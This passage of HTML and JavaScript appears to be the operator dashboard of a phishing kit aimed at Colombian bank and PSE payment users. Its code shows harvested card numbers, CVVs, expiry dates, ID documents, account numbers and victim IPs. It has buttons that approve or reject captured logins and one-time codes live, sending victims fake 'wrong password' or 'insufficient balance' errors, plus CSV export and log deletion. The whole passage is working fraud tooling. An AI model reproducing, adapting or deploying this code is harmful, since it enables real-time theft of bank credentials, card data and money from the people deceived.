            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=clave'
            }).then(() => { showToast('❌ Error Clave', 'error'); cargarDatos(); });
        }

        function errorSaldo(logId) {
            if (!logId) { showToast('No hay LOGIN pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=saldo'
            }).then(() => { showToast('💳 Error Saldo - Esperando ingreso de monto', 'warning'); cargarDatos(); });
        }

        // ======================== OTP ========================
        function aprobarOtp(logId) {
            if (!logId) { showToast('No hay OTP pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=aprobar&log_id=' + logId
            }).then(() => { showToast('✅ OTP Aprobado'); cargarDatos(); });
        }

        function errorDinamica(logId) {
            if (!logId) { showToast('No hay OTP pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=dinamica'
            }).then(() => { showToast('❌ Error Dinámica', 'error'); cargarDatos(); });
        }

        function errorOtp(logId) {
            if (!logId) { showToast('No hay OTP pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=otp'
            }).then(() => { showToast('❌ Error OTP', 'error'); cargarDatos(); });
        }

        // ======================== BORRAR ========================
        function borrarSesion(logId) {
            if (!logId) { showToast('No hay ID para eliminar', 'error'); return; }
            if (confirm('¿Eliminar esta sesión?')) {
                fetch('borrar_log.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'log_id=' + logId
                }).then(() => { showToast('🗑️ Sesión eliminada', 'warning'); cargarDatos(); });
            }
        }

        function borrarTodosLogs() {
            if (confirm('⚠️ ¿Eliminar TODOS los registros?')) {
                fetch('borrar_todos_logs.php', { method: 'POST' }).then(() => {
                    showToast('🗑️ Todos eliminados', 'warning');
                    cargarDatos();
                });
            }
        }

        function exportarCSV() {
            window.location.href = 'exportar_csv.php';
        }

        // ======================== VER DETALLES ========================
        function verDetalles(datos) {
            const modal = document.getElementById('modalDetalles');
            const modalBody = document.getElementById('modalBody');
            const modalTitulo = document.getElementById('modalTitulo');
            
            let html = '';
            
            if (datos.tipo === 'TARJETA' || datos.numero_tarjeta) {
                modalTitulo.textContent = '💳 Detalles de Tarjeta';
                html = `
                    <div class="modal-row" style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Plan</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.plan_nombre}</div>
                        </div>
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Monto</div>
                            <div class="modal-field-value" style="font-size:14px; color:#ff8c00; font-weight:600;">$ ${new Intl.NumberFormat('es-CO').format(datos.plan_precio || datos.monto || 0)}</div>
                        </div>
                    </div>
                    <div class="modal-row" style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Titular</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.titular}</div>
                        </div>
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Documento</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.documento}</div>
                        </div>
                    </div>
                    <div class="modal-row" style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Tipo de Tarjeta</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.tipo_tarjeta === 'credito' ? 'Crédito' : 'Débito'}</div>
                        </div>
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Cuotas</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.cuotas || 'N/A'}</div>
                        </div>
                    </div>
                    <div class="modal-row full" style="display:grid; grid-template-columns:1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Número de Tarjeta</div>
                            <div class="modal-field-value" style="font-size:16px; color:#ff8c00; font-weight:600; font-family:monospace; letter-spacing:2px;">${datos.numero_tarjeta}</div>
                        </div>
                    </div>
                    <div class="modal-row" style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Vencimiento</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.vencimiento}</div>
                        </div>
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">CVV</div>
                            <div class="modal-field-value" style="font-size:14px; color:#ff8c00; font-weight:600; font-family:monospace; letter-spacing:2px;">${datos.cvc}</div>
                        </div>
                    </div>
                    <div class="modal-row" style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Fecha Registro</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.fecha}</div>
                        </div>
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">IP</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.ip}</div>
                        </div>
                    </div>
                `;
            } else {
                modalTitulo.textContent = '🏦 Detalles de PSE';
                html = `
                    <div class="modal-row" style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Plan</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.plan_nombre}</div>
                        </div>
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Monto</div>
                            <div class="modal-field-value" style="font-size:14px; color:#ff8c00; font-weight:600;">$ ${new Intl.NumberFormat('es-CO').format(datos.plan_precio || 0)}</div>
                        </div>
                    </div>
                    <div class="modal-row" style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Titular</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.titular_pse}</div>
                        </div>
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Documento</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.documento_pse}</div>
                        </div>
                    </div>
                    <div class="modal-row" style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Tipo Documento</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.tipo_documento}</div>
                        </div>
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Tipo Cuenta</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.tipo_cuenta}</div>
                        </div>
                    </div>
                    <div class="modal-row" style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Banco</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.banco_pse}</div>
                        </div>
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Número Cuenta</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.numero_cuenta}</div>
                        </div>
                    </div>
                    <div class="modal-row" style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">Fecha Registro</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.fecha}</div>
                        </div>
                        <div class="modal-field" style="background:#0d0d1a; padding:12px; border-radius:5px; border-left:3px solid #ff8c00;">
                            <div class="modal-field-label" style="font-size:11px; font-weight:bold; color:#888; text-transform:uppercase; margin-bottom:5px;">IP</div>
                            <div class="modal-field-value" style="font-size:14px; color:#fff; font-weight:600;">${datos.ip}</div>
                        </div>
                    </div>
                `;
            }
            
            modalBody.innerHTML = html;
            modal.style.display = 'flex';
        }

        function cerrarModal() {
            document.getElementById('modalDetalles').style.display = 'none';
        }

        // ======================== FILTROS ========================
        let bancoActivo = 'todos';

        function filtrarPorBanco(banco) {
            bancoActivo = banco;
            document.querySelectorAll('.filtro-btn').forEach(b => b.classList.remove('active'));
            document.querySelector(`.filtro-btn[data-banco="${banco}"]`)?.classList.add('active');
            aplicarFiltros();
        }

        function aplicarFiltros() {
            const texto = document.getElementById('filtroInput').value.toLowerCase();
            const cards = document.querySelectorAll('.sesion-card');

            cards.forEach(card => {
                const banco = card.dataset.banco || '';
                const usuario = card.dataset.usuario || '';
                const id = card.dataset.id || '';
                const coincideBanco = bancoActivo === 'todos' || banco === bancoActivo;
                const coincideTexto = !texto || usuario.includes(texto) || id.includes(texto) || banco.includes(texto);
                card.style.display = (coincideBanco && coincideTexto) ? '' : 'none';
            });
        }

        // ======================== CARGA DE DATOS ========================
        function cargarDatos() {
            fetch(window.location.href + '?ajax=1')
                .then(res => res.text())
                .then(html => {
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(html, 'text/html');
                    
                    // Actualizar lista de sesiones
                    const newList = doc.querySelector('#sesionesList');
                    if (newList) {
                        document.getElementById('sesionesList').innerHTML = newList.innerHTML;
                    }
                    
                    // Actualizar estadísticas
                    const newTotal = doc.querySelector('#statTotal');
                    const newPendientes = doc.querySelector('#statPendientes');
                    if (newTotal) {
                        const nuevoTotal = parseInt(newTotal.textContent);
                        
                        // Verificar si hay nuevos registros
                        if (nuevoTotal > ultimoTotal) {
                            const logs = obtenerLogsDesdeHTML();
                            if (logs.length > 0) {
                                detectarNuevosRegistros(logs);
                            }
                            ultimoTotal = nuevoTotal;
                        }
                        
                        document.getElementById('statTotal').textContent = newTotal.textContent;
                    }
                    
                    if (newPendientes) {
                        document.getElementById('statPendientes').textContent = newPendientes.textContent;
                    }
                    
                    aplicarFiltros();
                })
                .catch(err => console.log('Error:', err));
        }

        // ======================== AUTO-REFRESH ========================
        let autoRefreshInterval;

        function iniciarAutoRefresh() {
            autoRefreshInterval = setInterval(cargarDatos, 2000);
        }

        // ======================== INICIALIZAR ========================
        document.addEventListener('DOMContentLoaded', function() {
            // Obtener IDs iniciales de los logs
            const logs = obtenerLogsDesdeHTML();
            for (const log of logs) {
                const actividad = log.activity || '';
                const id = log.id;
                if (actividad.includes('LOGIN') && !actividad.includes('OTP') && !actividad.includes('DINÁMICA')) {
                    if (!ultimoLoginId) ultimoLoginId = id;
                } else if (actividad.includes('OTP') || actividad.includes('DINÁMICA')) {
                    if (!ultimoOtpId) ultimoOtpId = id;
                }
            }
            
            iniciarAutoRefresh();
            aplicarFiltros();
        });
    </script>
</body>
</html>
